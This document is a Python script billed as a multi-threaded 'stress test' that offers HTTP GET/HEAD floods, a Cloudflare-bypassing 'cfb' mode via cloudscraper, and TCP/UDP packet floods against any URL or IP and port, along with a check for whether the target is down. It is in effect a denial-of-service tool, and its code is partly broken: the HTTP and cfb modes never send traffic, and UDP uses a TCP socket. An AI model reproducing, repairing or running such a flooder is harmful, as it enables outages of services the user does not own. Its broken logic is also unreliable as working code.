import cloudscraper
import httpx
import socket
import threading
import time
from colorama import Fore, Style, init

init()

print("Layer 7: get, head, cfb")
print("Layer 4: tcp, udp")
protocol = input("Enter the method to use:")

if protocol in ["get", "head", "cfb"]:
    
    url = input("Enter the website URL (including http or https): ")
elif protocol in ["tcp", "udp"]:
    
    ip = input("Enter the IP address of the server: ")
    port = int(input("Enter the port number: "))
    
num_threads = int(input("Enter the number of threads to use: "))

duration = int(input("Enter the duration of the stress test in seconds: "))

if protocol == "udp":
    packet_size = 65507 # Maximum size for a UDP packet
elif protocol == "tcp":
    packet_size = 65535 # Maximum size for a TCP packet
 
packet_counter = 0
packet_counter_lock = threading.Lock()

# Create a connection pool
if protocol in ["get", "head"]:
    client = httpx.Client(pool_limits=httpx.PoolLimits(soft_limit=num_threads, hard_limit=num_threads))
elif protocol == "cfb":
    client = cloudscraper.create_scraper()

def stress_test(thread_id):
    global packet_counter

    if protocol in ["tcp", "udp"]:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    else:
        print(Fore.RED + f"Invalid protocol: {protocol}" + Style.RESET_ALL)
        return

    start_time = time.time()
    last_print_time = start_time - 9
    if thread_id == 0:
        if protocol in ["get", "head", "cfb"]:
            print(Fore.YELLOW + f"Stress testing started on {url} successfully!" + Style.RESET_ALL)
        elif protocol in ["tcp", "udp"]:
            print(Fore.YELLOW + f"Stress testing started on {ip}:{port} successfully!" + Style.RESET_ALL)
    while time.time() - start_time < duration:
        if protocol in ["get", "head", "cfb"]:
            send_request(client)
            with packet_counter_lock:
                packet_counter += 1
        elif protocol in ["tcp", "udp"]:
            send_packet(sock)
            with packet_counter_lock:
                packet_counter += 1
        if thread_id == 0 and time.time() - last_print_time >= 10:
            with packet_counter_lock:
                if protocol in ["get", "head", "cfb"]:
                    try:
                        response_start_time = time.time()
                        response = httpx.get(url)
                        response_end_time = time.time()
                        response_time = round((response_end_time - response_start_time) * 1000, 2)
                        print(Fore.GREEN + f"Website is up. Response time: {response_time} ms." + Style.RESET_ALL)
                    except Exception as e:
                        print(Fore.RED + f"Website is down." + Style.RESET_ALL)
                elif protocol in ["tcp", "udp"]:
                    print(f"Sent {packet_counter} packets to {ip}:{port}")
                last_print_time = time.time()

def send_request(client):
    try:
        if protocol == "get":
            response = client.get(url)
        elif protocol == "head":
            response = client.head(url)
    except Exception as e:
        pass # Suppress error messages

def send_packet(sock):
    try:
        if protocol == "tcp":
            sock.connect((ip, port))
            sock.send(b"X" * packet_size) # Send a packet with maximum size
            sock.close()
        elif protocol == "udp":
            sock.sendto(b"X" * packet_size, (ip, port)) # Send a packet with maximum size
    except Exception as e:
        pass 

threads = []
for i in range(num_threads):
    thread = threading.Thread(target=stress_test, args=(i,))
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()

print(Fore.YELLOW + "Stress test ended." + Style.RESET_ALL)

